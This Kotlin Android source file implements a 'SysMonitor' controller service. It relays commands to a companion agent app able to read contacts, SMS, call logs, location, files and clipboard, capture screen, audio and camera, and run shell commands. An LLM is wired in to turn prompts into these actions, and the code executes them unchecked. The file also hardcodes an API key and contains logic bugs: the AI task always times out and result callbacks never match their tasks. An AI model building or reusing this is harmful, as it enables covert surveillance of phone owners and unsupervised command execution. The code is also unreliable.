package com.sysmonitor.controller

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

const val PREFS_NAME = "controller_config"
const val KEY_AGENT_PACKAGE = "agent_package"

const val NVIDIA_API_KEY = "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"
const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"

class ControllerService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private val gson = Gson()
    var agentPackage = "com.sysmonitor"
    private var commandReceiver: CommandReceiver? = null
    private var resultReceiver: ResultReceiver? = null
    private val pendingCommands = ConcurrentHashMap<String, CommandCallback>()
    private val aiClient = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()

    interface CommandCallback {
        fun onResult(taskId: String, result: CommandResult)
    }

    data class CommandResult(
        val result: String?,
        val error: String?,
        val status: String
    )

    inner class LocalBinder : Binder() {
        fun getService(): ControllerService = this@ControllerService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("ControllerService", "onCreate")
        initializeService()
    }

    private fun initializeService() {
        try {
            loadConfig()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerReceivers()
            Log.d("ControllerService", "Service initialized, agent: $agentPackage")
        } catch (e: Exception) {
            Log.e("ControllerService", "Init error", e)
        }
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        agentPackage = prefs.getString(KEY_AGENT_PACKAGE, "com.sysmonitor") ?: "com.sysmonitor"
    }

    private fun registerReceivers() {
        resultReceiver = ResultReceiver()
        val resultFilter = IntentFilter("com.sysmonitor.ACTION_RESULT")
        registerReceiver(resultReceiver!!, resultFilter, Context.RECEIVER_NOT_EXPORTED)

        commandReceiver = CommandReceiver()
        val commandFilter = IntentFilter("com.sysmonitor.controller.ACTION_COMMAND")
        registerReceiver(commandReceiver!!, commandFilter, Context.RECEIVER_NOT_EXPORTED)
    }

    override fun onBind(intent: Intent): IBinder = binder

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        running = false
        commandReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        resultReceiver?.let { try { unregisterReceiver(it) } catch (e: Exception) {} }
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("controller_service", "SysMonitor Controller", NotificationManager.IMPORTANCE_LOW)
                .apply { description = "Controller communication service" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, MainControllerActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "controller_service")
            .setContentTitle("SysMonitor Controller")
            .setContentText("Connected to agent: $agentPackage")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    fun sendCommand(capability: String, args: Map<String, Any>, callback: CommandCallback? = null): String {
        val taskId = java.util.UUID.randomUUID().toString()
        callback?.let { pendingCommands[taskId] = it }

        val intent = Intent("com.sysmonitor.ACTION_COMMAND").apply {
            setClassName(agentPackage, "com.sysmonitor.MonitorService")
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
        }

        try {
            sendBroadcast(intent)
            Log.d("ControllerService", "Sent $capability to $agentPackage ($taskId)")
        } catch (e: Exception) {
            Log.e("ControllerService", "Send failed", e)
            callback?.onResult(taskId, CommandResult(null, e.message ?: "send failed", "failed"))
            pendingCommands.remove(taskId)
        }
        return taskId
    }

    fun sendCommandSync(capability: String, args: Map<String, Any>, timeoutMs: Long = 30000): Map<String, Any> {
        val latch = CountDownLatch(1)
        var resultMap: Map<String, Any>? = null

        sendCommand(capability, args, object : CommandCallback {
            override fun onResult(taskId: String, result: CommandResult) {
                resultMap = mapOf<String, Any>(
                    "taskId" to taskId,
                    "result" to (result.result ?: ""),
                    "error" to (result.error ?: ""),
                    "status" to result.status
                )
                latch.countDown()
            }
        })

        if (!latch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
            return mapOf("error" to "timeout", "status" to "timeout")
        }
        return resultMap ?: mapOf("error" to "unknown")
    }

    inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()

            val agentIntent = Intent("com.sysmonitor.ACTION_COMMAND").apply {
                setClassName(agentPackage, "com.sysmonitor.MonitorService")
                putExtra("capability", capability)
                putExtra("args", argsJson)
                putExtra("task_id", taskId)
            }

            try {
                sendBroadcast(agentIntent)
                Log.d("ControllerService", "Forwarded $capability to agent ($taskId)")
            } catch (e: Exception) {
                Log.e("ControllerService", "Forward failed", e)
            }
        }
    }

    inner class ResultReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val taskId = intent.getStringExtra("task_id") ?: ""
            val result = intent.getStringExtra("result") ?: ""
            val error = intent.getStringExtra("error") ?: ""
            val status = intent.getStringExtra("status") ?: ""

            Log.d("ControllerService", "Result for $taskId: $status")

            pendingCommands.remove(taskId)?.onResult(taskId, CommandResult(result, error, status))

            val uiIntent = Intent("com.sysmonitor.controller.ACTION_RESULT_UI").apply {
                putExtra("task_id", taskId)
                putExtra("result", result)
                putExtra("error", error)
                putExtra("status", status)
            }
            sendBroadcast(uiIntent)
        }
    }

    // ===== NVIDIA NEMOTRON 3 ULTRA AI INTEGRATION =====

    fun sendAiCommand(prompt: String, callback: CommandCallback? = null): String {
        val taskId = java.util.UUID.randomUUID().toString()
        val latch = CountDownLatch(1)
        callback?.let { pendingCommands[taskId] = it }

        Thread({
            try {
                val aiResponse = callNemotron(prompt)
                Log.d("AI", "Nemotron response: $aiResponse")

                val results = executeAiActions(aiResponse, taskId)

                val summary = StringBuilder("AI Task $taskId completed:\n\n")
                results.forEach { r ->
                    summary.append("Action: ${r["action"]}\n")
                    summary.append("Reasoning: ${r["reasoning"]}\n")
                    if (r["status"] == "completed") {
                        summary.append("Result: ${r["result"]}\n")
                    } else {
                        summary.append("Error: ${r["error"]}\n")
                    }
                    summary.append("\n")
                }

                val msg = summary.toString()
                if (latch.await(60, TimeUnit.SECONDS)) {
                    callback?.onResult(taskId, CommandResult(msg, null, "completed"))
                } else {
                    callback?.onResult(taskId, CommandResult(null, "AI task timed out", "timeout"))
                }
            } catch (e: Exception) {
                Log.e("AI", "Error", e)
                callback?.onResult(taskId, CommandResult(null, e.message, "failed"))
            }
        }, "ai-$taskId").start()

        return taskId
    }

    private fun callNemotron(prompt: String): String {
        try {
            val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
For each user request, respond with a JSON object containing:
{
  "action": "capability_name",
  "args": { ... },
  "reasoning": "why this action"
}
If multiple actions needed, return array of actions.
Only respond with valid JSON, no extra text."""

            val payload = mutableMapOf<String, Any>()
            payload["model"] = NVIDIA_MODEL
            payload["messages"] = listOf(
                mapOf("role" to "system", "content" to systemPrompt),
                mapOf("role" to "user", "content" to prompt)
            )
            payload["temperature"] = 0.1
            payload["max_tokens"] = 2048
            payload["top_p"] = 0.9
            payload["stream"] = false

            val body = gson.toJson(payload).toRequestBody("application/json".toMediaType())
            val req = Request.Builder()
                .url(NVIDIA_API_URL)
                .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
                .addHeader("Content-Type", "application/json")
                .post(body)
                .build()

            aiClient.newCall(req).execute().use { resp ->
                val responseBody = resp.body?.string() ?: ""
                if (resp.isSuccessful) {
                    val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
                    val content = json.get("choices").asJsonArray[0].asJsonObject
                        .get("message").asJsonObject.get("content").asString
                    return content
                } else {
                    Log.e("Nemotron", "API error: $resp.code - $responseBody")
                    return "{\"error\": \"API error: $resp.code\"}"
                }
            }
        } catch (e: Exception) {
            Log.e("Nemotron", "Error", e)
            return "{\"error\": \"${e.message}\"}"
        }
    }

    private fun executeAiActions(aiResponse: String, parentTaskId: String): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        try {
            val json = com.google.gson.JsonParser.parseString(aiResponse)
            val actions = when {
                json.isJsonArray -> json.asJsonArray
                json.isJsonObject -> {
                    val arr = com.google.gson.JsonArray()
                    arr.add(json)
                    arr
                }
                else -> return results
            }

            actions.forEach { actionJson ->
                val actionObj = actionJson.asJsonObject
                val action = actionObj.get("action")?.asString ?: ""
                val args = actionObj.get("args")?.asJsonObject
                val reasoning = actionObj.get("reasoning")?.asString ?: ""

                val argsMap = mutableMapOf<String, Any>()
                args?.entrySet()?.forEach { entry ->
                    val value: Any = when {
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
                        else -> entry.value.toString()
                    }
                    argsMap[entry.key] = value
                }

                val latch = CountDownLatch(1)
                var actionResult: Map<String, Any>? = null

                val tempCallback = object : CommandCallback {
                    override fun onResult(tid: String, result: CommandResult) {
                        if (tid == "$parentTaskId-$action") {
                            actionResult = mutableMapOf<String, Any>().apply {
                                put("action", action)
                                put("args", argsMap)
                                put("reasoning", reasoning)
                                put("result", result.result ?: "")
                                put("error", result.error ?: "")
                                put("status", result.status)
                            }
                            latch.countDown()
                        }
                    }
                }
                pendingCommands["$parentTaskId-$action"] = tempCallback

                sendCommand(action, argsMap, tempCallback)

                if (latch.await(30, TimeUnit.SECONDS)) {
                    actionResult?.let { results.add(it) }
                } else {
                    results.add(mutableMapOf<String, Any>().apply {
                        put("action", action)
                        put("args", argsMap)
                        put("reasoning", reasoning)
                        put("error", "Action timeout")
                        put("status", "timeout")
                    })
                }
            }
        } catch (e: Exception) {
            Log.e("AI", "Parse error", e)
            results.add(mutableMapOf<String, Any>().apply {
                put("error", e.message)
                put("raw_response", aiResponse)
            })
        }
        return results
    }
}